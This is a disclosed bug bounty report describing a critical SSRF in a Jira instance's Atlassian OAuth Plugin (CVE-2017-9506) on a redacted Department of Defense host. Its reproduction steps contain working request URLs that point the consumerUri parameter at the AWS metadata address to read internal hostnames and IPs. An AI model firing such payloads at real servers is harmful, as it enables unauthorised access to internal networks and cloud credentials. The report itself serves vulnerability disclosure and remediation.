# SSRF on █████████ Allowing internal server data access

## Report Details
- **Report ID**: 326040
- **URL**: https://hackerone.com/reports/326040
- **State**: Closed
- **Severity**: critical
- **Submitted**: 2018-03-15T03:41:47.205Z
- **Disclosed**: 2019-10-08T18:54:58.082Z

## Reporter
- **Username**: alyssa_herrera
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: deptofdefense

## Vulnerability Information
**Summary:**
An end point on ██████ allows an internal access to the network thus revealing sensitive data and allowing internal tunneling 
**Description:**
OAuth Plugin allows you to provide a url that gives a snap shot of the web page. We can pass internal URLS and conduct SSRF.
## Impact
Critical
## Step-by-step Reproduction Instructions
https://███████/plugins/servlet/oauth/users/icon-uri?consumerUri=http://169.254.169.254/latest/meta-data/hostname
We can see the follow data 
ip-172-31-12-254.█████████.compute.internal
https://████████/plugins/servlet/oauth/users/icon-uri?consumerUri=http://169.254.169.254/latest/meta-data/public-ipv4
███████

## Product, Version, and Configuration (If applicable)
Jira 
## Suggested Mitigation/Remediation Actions
Update to recent version

## Impact

An attacker can tunnel into internal networks and access sensitive internal data such as AWS meta data information.

The hacker selected the **Server-Side Request Forgery (SSRF)** weakness. This vulnerability type requires contextual information from the hacker. They provided the following answers:

**Can internal services be reached bypassing network access control?**
Yes

**What internal services were accessible?**
AWS Bucket  Meta data

**Security Impact**
CVE-2017-9506 - The IconUriServlet of the Atlassian OAuth Plugin from version 1.3.0 before version 1.9.12 and from version 2.0.0 before version 2.0.4 allows remote attackers to access the content of internal network resources and/or perform an XSS attack via Server Side Request Forgery (SSRF).



## Attachments
No attachments
